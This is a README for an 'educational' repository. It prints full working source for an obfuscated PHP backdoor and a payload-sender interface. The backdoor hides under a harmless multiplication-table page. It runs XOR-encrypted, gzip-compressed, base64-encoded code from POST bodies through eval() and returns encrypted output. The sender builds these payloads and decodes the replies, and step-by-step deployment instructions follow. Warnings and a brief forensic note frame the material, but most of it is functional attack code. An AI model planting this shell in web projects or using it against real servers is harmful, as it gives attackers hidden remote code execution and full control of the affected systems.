# PHP Backdoor Example (For Educational Purposes Only)

## ⚠️ WARNING

This repository demonstrates a **PHP backdoor** and a **payload sender** for **educational and security research purposes only**.  
**Do not use this code on any system you do not own or have explicit permission to test.**  
Leaving this code on a public server is a severe security risk.

---

## 1. What is This?

This project contains two files:

- `index.php`: A PHP script with a hidden backdoor that allows remote code execution via specially crafted POST requests.
- `send_payload.php`: A web interface to send PHP code to the backdoor and display the output.

---

## 2. How Does the Backdoor Work?

### `index.php`

```php
<?php
echo "<h3>Table of 2</h3>";
for ($i = 1; $i <= 10; $i++) {
    echo "2 x $i = " . (2 * $i) . "<br>";
}
?>

<?php
$k="3b712de4";
$kh="8137572f3849";
$kf="aabd5666a4e3";
$p="wowzoun0lxqf0Qwj";
function x($t,$k){
    $c=strlen($k);$l=strlen($t);$o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t[$i]^$k[$j];
        }
    }
    return $o;
}
if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
    $o=@ob_get_contents();
    @ob_end_clean();
    $r=@base64_encode(@x(@gzcompress($o),$k));
    print("$p$kh$r$kf");
}
?>
```

**How it works:**

- **Trigger:** Activated by a POST request containing a payload between `$kh` and `$kf`.
- **Payload:** The payload is base64-encoded, XOR-encrypted, and gzcompressed PHP code.
- **Execution:** The payload is decoded, decrypted, decompressed, and executed with `eval()`.
- **Response:** The output is captured, compressed, XOR-encrypted, base64-encoded, and returned between `$p$kh` and `$kf`.

---

## 3. How Does the Payload Sender Work?

### `send_payload.php`

```php
<?php

// --- CONFIGURE ---
$target_url = 'http://localhost/index.php'; // Change if needed
$key = "3b712de4";
$kh = "8137572f3849";
$kf = "aabd5666a4e3";
$p = "wowzoun0lxqf0Qwj";

// --- XOR FUNCTION ---
function xor_string($data, $key) {
    $output = '';
    $dataLen = strlen($data);
    $keyLen = strlen($key);
    for ($i = 0; $i < $dataLen; $i++) {
        $output .= $data[$i] ^ $key[$i % $keyLen];
    }
    return $output;
}

// --- FORM HANDLER ---
$output = '';
$display_mode = isset($_POST['display_mode']) ? $_POST['display_mode'] : 'text';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['php_code'])) {
    $php_code = $_POST['php_code'];

    // Encode payload
    $compressed = gzcompress($php_code);
    $xored = xor_string($compressed, $key);
    $encoded = base64_encode($xored);
    $payload = $kh . $encoded . $kf;

    // Send payload
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: text/plain\r\n",
            'content' => $payload,
        ]
    ];
    $context  = stream_context_create($options);
    $response = file_get_contents($target_url, false, $context);

    // Extract and decode output
    if (preg_match("/$p$kh(.+)$kf/s", $response, $m)) {
        $resp_encoded = $m[1];
        $resp_xored = base64_decode($resp_encoded);
        $resp_decompressed = @gzuncompress(xor_string($resp_xored, $key));
        if ($display_mode === 'html') {
            $output = $resp_decompressed;
        } else {
            $output = htmlspecialchars($resp_decompressed);
        }
    } else {
        $output = "No valid response received.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Backdoor Payload Sender</title>
</head>
<body>
    <h2>Send PHP Code to Backdoor</h2>
    <form method="post">
        <textarea name="php_code" rows="8" cols="60" placeholder="Enter PHP code here"><?php
            if (isset($_POST['php_code'])) echo htmlspecialchars($_POST['php_code']);
        ?></textarea><br>
        <label>
            <input type="radio" name="display_mode" value="text" <?php if ($display_mode === 'text') echo 'checked'; ?>>
            Show as Text
        </label>
        <label>
            <input type="radio" name="display_mode" value="html" <?php if ($display_mode === 'html') echo 'checked'; ?>>
            Show as HTML
        </label>
        <br>
        <button type="submit">Send & Get Output</button>
    </form>
    <?php if ($output !== ''): ?>
        <h3>Output:</h3>
        <pre><?php echo $output; ?></pre>
    <?php endif; ?>
</body>
</html>
```

**How it works:**

- Enter PHP code in the textarea and submit.
- The script sends the payload, receives the response, decodes it, and displays the output below the form.
- You can choose to display the output as plain text or rendered HTML.

---

## 4. How to Use

1. **Start your local server** (e.g., XAMPP, WAMP, etc.).
2. Place `index.php` and `send_payload.php` in your web root (e.g., `htdocs`).
3. Open `send_payload.php` in your browser.
4. Enter PHP code in the textarea (e.g., `<?php echo "Hello"; ?>`).
5. Choose output mode:  
   - **Text:** Output is HTML-escaped.  
   - **HTML:** Output is rendered as HTML.
6. Click **Send & Get Output** to execute the code via the backdoor and see the result.

---

## 5. Security Notice

- **Remove these files immediately after testing.**
- This backdoor allows arbitrary code execution and is a critical security risk.
- Never deploy this code on a production or public server.

---

## 6. Forensic/Recovery Use

If you find this code on your server, remove it and change all credentials.  
Scan your server for other backdoors or malicious files.

---